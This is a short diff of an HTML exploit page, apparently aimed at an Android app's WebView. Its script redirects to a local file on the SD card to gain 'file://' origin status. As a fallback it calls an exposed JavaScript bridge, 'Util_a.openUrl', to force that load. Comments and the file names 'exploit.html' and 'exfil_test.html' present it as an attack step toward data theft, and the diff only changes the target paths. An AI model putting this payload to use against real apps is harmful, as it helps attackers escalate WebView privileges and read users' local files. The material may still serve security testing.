@@ -4,12 +4,12 @@
     <script>
         // Redirecting to a local file to gain 'file://' origin status
         // If you can't upload a file to the SD card, target a known app asset
-        window.location.href = "file:///sdcard/Download/exploit.html";
+        window.location.href = "file:///sdcard/exfil_test.html";
         
         // Backup: Try using the bridge to force the local load
         setTimeout(() => {
             if(window.Util_a) {
-                window.Util_a.openUrl("file:///sdcard/Download/exfil_test.html");
+                window.Util_a.openUrl("file:///sdcard/exfil_test.html");
             }
         }, 1000);
     </script>
